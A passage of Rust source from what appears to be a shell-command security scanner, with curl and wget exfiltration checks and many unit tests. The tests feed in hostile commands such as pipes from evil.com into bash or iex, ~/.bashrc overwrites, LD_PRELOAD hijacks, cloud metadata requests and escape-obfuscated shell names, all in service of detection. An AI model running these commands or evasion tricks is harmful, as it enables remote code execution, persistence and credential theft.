                || norm == "--upload-file")
                && i + 1 < args.len()
            {
                i += 1;
                Some(normalize_shell_token(&args[i], shell))
            } else if norm.starts_with("-d") && norm.len() > 2 {
                // Combined -dVAL
                Some(norm[2..].to_string())
            } else if norm.starts_with("-F") && norm.len() > 2 {
                // Combined -FVAL
                Some(norm[2..].to_string())
            } else {
                None
            };

            if let Some(val) = value {
                let is_sensitive = if is_upload_flag {
                    // -T uses direct file paths (no @)
                    SENSITIVE_PATHS.iter().any(|p| val.contains(p))
                } else {
                    is_sensitive_file_ref(&val)
                        || has_sensitive_env_ref(&val)
                        || has_sensitive_cmd_substitution(&val)
                };

                if is_sensitive {
                    findings.push(Finding {
                        rule_id: RuleId::DataExfiltration,
                        severity: Severity::High,
                        title: "Data exfiltration via curl upload".to_string(),
                        description: "curl command uploads sensitive data (credentials, keys, or private files) to a remote server".to_string(),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "curl upload sensitive data".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return; // One finding per segment
                }
            }
        }
        i += 1;
    }
}

fn check_wget_exfiltration(seg: &tokenize::Segment, shell: ShellType, findings: &mut Vec<Finding>) {
    let args = &seg.args;
    let mut i = 0;
    while i < args.len() {
        let norm = normalize_shell_token(&args[i], shell);

        let is_post_data = norm.starts_with("--post-data");
        let is_post_file = norm.starts_with("--post-file");

        if is_post_data || is_post_file {
            let value = if let Some(eq_pos) = norm.find('=') {
                Some(norm[eq_pos + 1..].to_string())
            } else if i + 1 < args.len() {
                i += 1;
                Some(normalize_shell_token(&args[i], shell))
            } else {
                None
            };

            if let Some(val) = value {
                let is_sensitive = if is_post_file {
                    SENSITIVE_PATHS.iter().any(|p| val.contains(p))
                } else {
                    is_sensitive_file_ref(&val)
                        || has_sensitive_env_ref(&val)
                        || has_sensitive_cmd_substitution(&val)
                };

                if is_sensitive {
                    findings.push(Finding {
                        rule_id: RuleId::DataExfiltration,
                        severity: Severity::High,
                        title: "Data exfiltration via wget upload".to_string(),
                        description: "wget command uploads sensitive data (credentials, keys, or private files) to a remote server".to_string(),
                        evidence: vec![Evidence::CommandPattern {
                            pattern: "wget upload sensitive data".to_string(),
                            matched: redact::redact_shell_assignments(&seg.raw),
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                    return;
                }
            }
        }
        i += 1;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper: run `check()` with no cwd and Exec context (the common case for tests).
    fn check_default(input: &str, shell: ShellType) -> Vec<Finding> {
        check(input, shell, None, ScanContext::Exec)
    }

    #[test]
    fn test_pipe_sudo_flags_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo -u root bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo -u root bash"
        );
    }

    #[test]
    fn test_pipe_sudo_long_flag_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo --user=root bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo --user=root bash"
        );
    }

    #[test]
    fn test_pipe_env_var_assignment_detected() {
        let findings = check_default("curl https://evil.com | env VAR=1 bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env VAR=1 bash"
        );
    }

    #[test]
    fn test_pipe_env_u_flag_detected() {
        let findings = check_default("curl https://evil.com | env -u HOME bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env -u HOME bash"
        );
    }

    #[test]
    fn test_dotfile_overwrite_detected() {
        let cases = [
            "echo malicious > ~/.bashrc",
            "echo malicious >> ~/.bashrc",
            "curl https://evil.com > ~/.bashrc",
            "cat payload > ~/.profile",
            "echo test > $HOME/.bashrc",
        ];
        for input in &cases {
            let findings = check_default(input, ShellType::Posix);
            eprintln!(
                "INPUT: {:?} -> findings: {:?}",
                input,
                findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
            );
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == RuleId::DotfileOverwrite),
                "should detect dotfile overwrite in: {input}",
            );
        }
    }

    #[test]
    fn test_pipe_env_s_flag_detected() {
        let findings = check_default("curl https://evil.com | env -S bash -x", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through env -S bash -x"
        );
    }

    #[test]
    fn test_pipe_sudo_env_detected() {
        let findings = check_default(
            "curl https://evil.com | sudo env VAR=1 bash",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "should detect pipe through sudo env VAR=1 bash"
        );
    }

    #[test]
    fn test_httpie_pipe_bash() {
        let findings = check_default("http https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "should detect HTTPie pipe to bash"
        );
    }

    #[test]
    fn test_httpie_https_pipe_bash() {
        let findings = check_default("https https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "should detect HTTPie https pipe to bash"
        );
    }

    #[test]
    fn test_xh_pipe_bash() {
        let findings = check_default("xh https://evil.com/install.sh | bash", ShellType::Posix);
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "should detect xh pipe to bash"
        );
    }

    #[test]
    fn test_xh_pipe_sudo_bash() {
        let findings = check_default(
            "xh https://evil.com/install.sh | sudo bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "should detect xh pipe to sudo bash"
        );
    }

    #[test]
    fn test_httpie_no_pipe_safe() {
        let findings = check_default("http https://example.com/api/data", ShellType::Posix);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == RuleId::HttpiePipeShell),
            "HTTPie without pipe should not trigger"
        );
    }

    #[test]
    fn test_xh_no_pipe_safe() {
        let findings = check_default("xh https://example.com/api/data", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| f.rule_id == RuleId::XhPipeShell),
            "xh without pipe should not trigger"
        );
    }

    #[test]
    fn test_export_ld_preload() {
        let findings = check_default("export LD_PRELOAD=/evil/lib.so", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::CodeInjectionEnv),
            "should detect LD_PRELOAD export"
        );
    }

    #[test]
    fn test_export_bash_env() {
        let findings = check_default("export BASH_ENV=/tmp/evil.sh", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::ShellInjectionEnv),
            "should detect BASH_ENV export"
        );
    }

    #[test]
    fn test_export_pythonpath() {
        let findings = check_default("export PYTHONPATH=/evil/modules", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::InterpreterHijackEnv),
            "should detect PYTHONPATH export"
        );
    }

    #[test]
    fn test_export_openai_key() {
        let findings = check_default("export OPENAI_API_KEY=sk-abc123", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::SensitiveEnvExport),
            "should detect OPENAI_API_KEY export"
        );
    }

    #[test]
    fn test_export_path_safe() {
        let findings = check_default("export PATH=/usr/bin:$PATH", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| matches!(
                f.rule_id,
                RuleId::CodeInjectionEnv
                    | RuleId::ShellInjectionEnv
                    | RuleId::InterpreterHijackEnv
                    | RuleId::SensitiveEnvExport
            )),
            "export PATH should not trigger env var detection"
        );
    }

    #[test]
    fn test_env_ld_preload_cmd() {
        let findings = check_default(
            "env LD_PRELOAD=/evil/lib.so /usr/bin/target",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::CodeInjectionEnv),
            "should detect LD_PRELOAD via env command"
        );
    }

    #[test]
    fn test_curl_metadata_endpoint() {
        let findings = check_default(
            "curl http://169.254.169.254/latest/meta-data",
            ShellType::Posix,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::MetadataEndpoint),
            "should detect AWS metadata endpoint"
        );
    }

    #[test]
    fn test_curl_private_network() {
        let findings = check_default("curl http://10.0.0.1/internal/api", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PrivateNetworkAccess),
            "should detect private network access"
        );
    }

    #[test]
    fn test_curl_public_ip_safe() {
        let findings = check_default("curl http://8.8.8.8/dns-query", ShellType::Posix);
        assert!(
            !findings.iter().any(|f| matches!(
                f.rule_id,
                RuleId::MetadataEndpoint | RuleId::PrivateNetworkAccess
            )),
            "public IP should not trigger network destination detection"
        );
    }

    #[test]
    fn test_metadata_bare_ip() {
        let findings = check_default("curl 169.254.169.254/latest/meta-data", ShellType::Posix);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::MetadataEndpoint),
            "should detect bare IP metadata endpoint"
        );
    }

    #[test]
    fn test_extract_host_from_url() {
        assert_eq!(
            extract_host_from_arg("http://169.254.169.254/latest"),
            Some("169.254.169.254".to_string())
        );
        assert_eq!(
            extract_host_from_arg("http://10.0.0.1:8080/api"),
            Some("10.0.0.1".to_string())
        );
        assert_eq!(
            extract_host_from_arg("169.254.169.254/path"),
            Some("169.254.169.254".to_string())
        );
        assert_eq!(
            extract_host_from_arg("8.8.8.8"),
            Some("8.8.8.8".to_string())
        );
        assert_eq!(extract_host_from_arg("-H"), None);
        assert_eq!(extract_host_from_arg("output.txt"), None);
    }

    // --- Network policy tests ---

    #[test]
    fn test_network_policy_deny_exact() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "curl https://evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_deny_subdomain() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "wget https://sub.evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_deny_cidr() {
        let deny = vec!["10.0.0.0/8".to_string()];
        let allow = vec![];
        let findings =
            check_network_policy("curl http://10.1.2.3/api", ShellType::Posix, &deny, &allow);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_network_policy_allow_exempts() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec!["safe.evil.com".to_string()];
        let findings = check_network_policy(
            "curl https://safe.evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 0, "allow list should exempt from deny");
    }

    #[test]
    fn test_network_policy_no_match() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "curl https://example.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 0);
    }

    #[test]
    fn test_network_policy_empty_deny() {
        let deny = vec![];
        let allow = vec![];
        let findings =
            check_network_policy("curl https://evil.com", ShellType::Posix, &deny, &allow);
        assert_eq!(
            findings.len(),
            0,
            "empty deny list should produce no findings"
        );
    }

    #[test]
    fn test_cidr_contains() {
        assert_eq!(cidr_contains("10.0.0.1", "10.0.0.0/8"), Some(true));
        assert_eq!(cidr_contains("10.255.255.255", "10.0.0.0/8"), Some(true));
        assert_eq!(cidr_contains("11.0.0.1", "10.0.0.0/8"), Some(false));
        assert_eq!(cidr_contains("192.168.1.1", "192.168.0.0/16"), Some(true));
        assert_eq!(cidr_contains("192.169.1.1", "192.168.0.0/16"), Some(false));
        assert_eq!(cidr_contains("not-an-ip", "10.0.0.0/8"), None);
        assert_eq!(cidr_contains("10.0.0.1", "invalid"), None);
    }

    #[test]
    fn test_matches_network_list_hostname() {
        let list = vec!["evil.com".to_string(), "bad.org".to_string()];
        assert!(matches_network_list("evil.com", &list));
        assert!(matches_network_list("sub.evil.com", &list));
        assert!(!matches_network_list("notevil.com", &list));
        assert!(!matches_network_list("good.com", &list));
    }

    #[test]
    fn test_flag_value_url_detected_in_network_policy() {
        let deny = vec!["evil.com".to_string()];
        let allow = vec![];
        let findings = check_network_policy(
            "curl --url=http://evil.com/data",
            ShellType::Posix,
            &deny,
            &allow,
        );
        assert_eq!(findings.len(), 1, "should detect denied host in --flag=URL");
        assert_eq!(findings[0].rule_id, RuleId::CommandNetworkDeny);
    }

    #[test]
    fn test_flag_value_url_metadata_endpoint() {
        let findings = check(
            "curl --url=http://169.254.169.254/latest/meta-data",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::MetadataEndpoint),
            "should detect metadata endpoint in --flag=URL"
        );
    }

    #[test]
    fn test_flag_value_url_private_network() {
        let findings = check(
            "curl --url=http://10.0.0.1/internal",
            ShellType::Posix,
            None,
            ScanContext::Exec,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PrivateNetworkAccess),
            "should detect private network in --flag=URL"
        );
    }

    #[test]
    fn test_strip_port_unbracketed_ipv6() {
        assert_eq!(strip_port("fe80::1"), "fe80::1");
    }

    #[test]
    fn test_vet_not_configured_fires_without_supply_chain() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_not_configured_suppressed_with_supply_chain() {
        let dir = tempfile::tempdir().unwrap();
        let sc_dir = dir.path().join("supply-chain");
        std::fs::create_dir_all(&sc_dir).unwrap();
        std::fs::write(sc_dir.join("config.toml"), "").unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_not_configured_skips_non_install() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo build",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_detects_cargo_with_flags() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            "cargo --locked install serde",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f2 = check(
            "cargo +nightly add tokio",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f3 = check(
            "cargo -Z sparse-registry install serde",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f3.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_skipped_in_paste_context() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Paste,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_no_false_positive_on_non_install_subcommand() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            "cargo test --package add",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f2 = check(
            "cargo build install",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_detects_cargo_exe_windows_path() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            r"C:\Users\dev\.cargo\bin\cargo.exe install serde",
            ShellType::PowerShell,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(
            f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured),
            "should detect cargo.exe with Windows backslash path"
        );
        let f2 = check(
            r"C:\Users\dev\.cargo\bin\CARGO.EXE install serde",
            ShellType::PowerShell,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(
            f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured),
            "should detect CARGO.EXE case-insensitively"
        );
    }

    // ── normalize_shell_token unit tests ──

    #[test]
    fn test_normalize_ansi_c_basic() {
        assert_eq!(normalize_shell_token("$'bash'", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_ansi_c_hex() {
        assert_eq!(
            normalize_shell_token("$'\\x62\\x61\\x73\\x68'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_normalize_ansi_c_octal() {
        assert_eq!(
            normalize_shell_token("$'\\142\\141\\163\\150'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_normalize_ansi_c_octal_leading_zero() {
        // \057 = '/' (octal 057 = 47 decimal = '/')
        assert_eq!(
            normalize_shell_token("$'\\057bin\\057bash'", ShellType::Posix),
            "/bin/bash"
        );
    }

    #[test]
    fn test_normalize_ansi_c_bare_zero() {
        // \0 alone (no following octal digits) should still be NUL
        assert_eq!(normalize_shell_token("$'a\\0b'", ShellType::Posix), "a\0b");
    }

    #[test]
    fn test_normalize_ansi_c_unicode() {
        assert_eq!(
            normalize_shell_token("$'\\u0062ash'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_normalize_double_quotes() {
        assert_eq!(normalize_shell_token("\"bash\"", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_cmd_caret_inside_double_quotes() {
        assert_eq!(normalize_shell_token("\"c^md\"", ShellType::Cmd), "cmd");
    }

    #[test]
    fn test_normalize_single_quotes() {
        assert_eq!(normalize_shell_token("'bash'", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_backslash() {
        assert_eq!(normalize_shell_token("ba\\sh", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_empty_concat() {
        assert_eq!(normalize_shell_token("ba''sh", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_mixed_concat() {
        assert_eq!(normalize_shell_token("'ba'sh", ShellType::Posix), "bash");
    }

    #[test]
    fn test_normalize_powershell_backtick() {
        assert_eq!(
            normalize_shell_token("`i`e`x", ShellType::PowerShell),
            "iex"
        );
    }

    #[test]
    fn test_normalize_unclosed_single_quote() {
        // Unclosed quote: everything after ' is literal, state ends in SINGLE_QUOTE
        let result = normalize_shell_token("'bash", ShellType::Posix);
        assert_eq!(result, "bash");
    }

    #[test]
    fn test_normalize_unclosed_double_quote() {
        let result = normalize_shell_token("\"bash", ShellType::Posix);
        assert_eq!(result, "bash");
    }

    // ── normalize_cmd_base unit tests ──

    #[test]
    fn test_cmd_base_path() {
        assert_eq!(
            normalize_cmd_base("/usr/bin/bash", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_cmd_base_ansi_c() {
        assert_eq!(normalize_cmd_base("$'bash'", ShellType::Posix), "bash");
    }

    #[test]
    fn test_cmd_base_exe() {
        assert_eq!(normalize_cmd_base("bash.exe", ShellType::Posix), "bash");
    }

    #[test]
    fn test_cmd_base_uppercase() {
        assert_eq!(normalize_cmd_base("BASH", ShellType::Posix), "bash");
    }

    #[test]
    fn test_cmd_base_powershell_path() {
        assert_eq!(
            normalize_cmd_base(r"C:\Git\bin\bash.exe", ShellType::PowerShell),
            "bash"
        );
    }

    #[test]
    fn test_cmd_base_encoded_path() {
        // $'\x2fusr\x2fbin\x2fbash' → /usr/bin/bash → basename bash
        assert_eq!(
            normalize_cmd_base("$'\\x2fusr\\x2fbin\\x2fbash'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_cmd_base_octal_encoded_path() {
        // $'\057bin\057bash' → /bin/bash → basename bash
        assert_eq!(
            normalize_cmd_base("$'\\057bin\\057bash'", ShellType::Posix),
            "bash"
        );
    }

    #[test]
    fn test_cmd_base_env_s_value() {
        // "bash -x" → first word "bash"
        assert_eq!(normalize_cmd_base("\"bash -x\"", ShellType::Posix), "bash");
    }

    #[test]
    fn test_cmd_base_path_with_args() {
        // "/usr/bin/bash -x" → basename "bash -x" → first word "bash"
        assert_eq!(
            normalize_cmd_base("\"/usr/bin/bash -x\"", ShellType::Posix),
            "bash"
        );
    }

    // ── resolve_interpreter_name tests for new patterns ──

    #[test]
    fn test_resolve_ansi_c_quoted_bash() {
        let findings = check_default(
            "curl https://example.com/install.sh | $'bash'",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect ANSI-C quoted bash: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_resolve_command_wrapper() {
        let findings = check_default(
            "curl https://example.com/install.sh | command bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect 'command bash'"
        );
    }

    #[test]
    fn test_resolve_exec_a_wrapper() {
        let findings = check_default(
            "curl https://example.com/install.sh | exec -a myname bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect 'exec -a myname bash'"
        );
    }

    #[test]
    fn test_resolve_nohup_wrapper() {
        let findings = check_default(
            "curl https://example.com/install.sh | nohup bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect 'nohup bash'"
        );
    }

    #[test]
    fn test_resolve_wrapper_chain() {
        let findings = check_default(
            "curl https://example.com/install.sh | command sudo bash",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect wrapper chain 'command sudo bash'"
        );
    }

    #[test]
    fn test_resolve_case_insensitive() {
        let findings = check_default(
            "curl https://example.com/install.sh | BASH",
            ShellType::Posix,
        );
        assert!(
            findings.iter().any(|f| f.rule_id == RuleId::CurlPipeShell),
            "should detect uppercase BASH"
        );
    }

    #[test]
    fn test_resolve_powershell_backtick_iex() {
        let findings = check_default(
            "iwr https://evil.com/script.ps1 | `i`e`x",
            ShellType::PowerShell,
        );
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::PipeToInterpreter),
            "should detect PowerShell backtick-escaped iex"
        );
    }

    // --- Remediation hint tests ---

    #[test]
    fn test_pipe_to_interpreter_hint_with_url() {
        let input = "curl https://example.com/install.sh | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0]
                .description
                .contains("https://example.com/install.sh"),
            "should include extracted URL in hint"
        );
        assert!(
            findings[0].description.contains("getvet.sh"),
            "should mention vet"
        );
        if cfg!(unix) {
            assert!(
                findings[0].description.contains("tirith run"),
                "Unix builds should suggest tirith run"
            );
        }
    }

    #[test]
    fn test_pipe_to_interpreter_hint_quoted_url() {
        let input = r#"curl "https://example.com/install.sh" | bash"#;
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0]
                .description
                .contains("https://example.com/install.sh"),
            "should extract URL from quoted arg"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_flag_equals_url() {
        let input = "curl --url=https://example.com/install.sh | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0]
                .description
                .contains("https://example.com/install.sh"),
            "should extract URL from --flag=value"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_evidence_includes_all_source_urls() {
        let input =
            "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);

        let urls: Vec<&str> = findings[0]
            .evidence
            .iter()
            .filter_map(|e| match e {
                Evidence::Url { raw } => Some(raw.as_str()),
                _ => None,
            })
            .collect();

        assert_eq!(
            urls.len(),
            2,
            "all source URLs must be preserved in evidence"
        );
        assert!(urls.contains(&"https://trusted.example.com/install.sh"));
        assert!(urls.contains(&"https://evil.example.com/payload.sh"));
    }

    #[test]
    fn test_pipe_to_interpreter_no_hint_for_cat() {
        let input = "cat /tmp/script.sh | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            !findings[0].description.contains("getvet.sh"),
            "non-fetch source should NOT get vet hint"
        );
        assert!(
            !findings[0].description.contains("tirith run"),
            "non-fetch source should NOT get tirith run hint"
        );
    }

    #[test]
    fn test_dashdash_stops_flag_skipping() {
        // "command -- -x" should treat -x as the command, not a flag
        let input = "curl https://example.com/install.sh | command -- bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1, "should detect bash after --");
    }

    #[test]
    fn test_sudo_dashdash_resolves_command() {
        // "sudo -- bash" should resolve to bash (-- ends sudo's options)
        let input = "curl https://example.com/install.sh | sudo -- bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1, "should detect bash after sudo --");
        assert!(
            findings[0].description.contains("interpreter 'bash'"),
            "should resolve to bash: {}",
            findings[0].description
        );
    }

    #[test]
    fn test_ansic_quoting_not_applied_to_fish() {
        // Fish doesn't support $'...' — it should be treated as literal $
        assert_eq!(normalize_shell_token("$'bash'", ShellType::Fish), "$bash");
        // But POSIX should strip the $'...' wrapper
        assert_eq!(normalize_shell_token("$'bash'", ShellType::Posix), "bash");
    }

    #[test]
    fn test_powershell_doubled_single_quote() {
        // PowerShell: '' inside single quotes is an escaped literal '
        assert_eq!(
            normalize_shell_token("'it''s'", ShellType::PowerShell),
            "it's"
        );
        // POSIX: '' ends and reopens — produces empty join
        assert_eq!(normalize_shell_token("'it''s'", ShellType::Posix), "its");
    }

    #[test]
    fn test_sudo_combined_short_flags() {
        // sudo -iu root bash: -iu means -i -u, where -u takes "root" as value
        let input = "curl https://example.com/install.sh | sudo -iu root bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(
            findings.len(),
            1,
            "should detect pipe to bash through sudo -iu root"
        );
        assert!(
            findings[0].description.contains("interpreter 'bash'"),
            "should resolve to bash, not root: {}",
            findings[0].description
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_iwr_powershell() {
        let input = "iwr https://evil.com/script.ps1 | iex";
        let segments = tokenize::tokenize(input, ShellType::PowerShell);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::PowerShell, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0].description.contains("getvet.sh"),
            "iwr (PowerShell fetch) should get vet hint"
        );
        assert!(
            !findings[0].description.contains("tirith run"),
            "PowerShell fetch should NOT suggest tirith run"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_sanitizes_ansi_in_url() {
        // \x1b[31m is an ANSI "red" escape — must be stripped from hint
        let input = "curl https://example.com/\x1b[31mred | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        assert!(
            !findings[0].description.contains('\x1b'),
            "ANSI escape must be stripped from hint URL: {}",
            findings[0].description
        );
        assert!(
            findings[0]
                .description
                .contains("https://example.com/[31mred"),
            "URL should be present minus the ESC byte: {}",
            findings[0].description
        );
    }

    #[test]
    fn test_pipe_to_interpreter_hint_sanitizes_newline_in_url() {
        // Newline in URL arg could spoof extra output lines
        let input = "curl \"https://example.com/\nFAKE: safe\" | bash";
        let segments = tokenize::tokenize(input, ShellType::Posix);
        let mut findings = Vec::new();
        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
        assert_eq!(findings.len(), 1);
        // The \n must be stripped — "FAKE" collapses onto the URL, not a separate line
        let hint_line = findings[0]
            .description
            .lines()
            .find(|l| l.contains("Safer:"))
